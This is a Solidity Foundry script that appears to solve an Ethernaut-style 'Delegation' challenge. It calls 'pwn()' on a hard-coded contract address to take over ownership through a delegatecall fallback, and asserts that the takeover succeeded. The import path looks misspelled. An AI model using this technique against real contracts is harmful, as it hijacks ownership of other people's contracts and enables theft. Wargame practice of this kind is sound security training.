// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "@oppenzeppelin/contracts/access/Ownable.sol";

address constant INSTANCE = 0xD6A8567e059Be68ce4d869c65Bbca3E134af7Be1;

contract DelegatePOCScript is Script {
    function run() external {
        assert(Ownable(INSTANCE).owner() != msg.sender);

        vm.broadcast();
        (bool success,) = address(INSTANCE).call(abi.encodeWithSignature("pwn()"));
        assert(success);

        assert(Ownable(INSTANCE).owner() == msg.sender);
    }
}
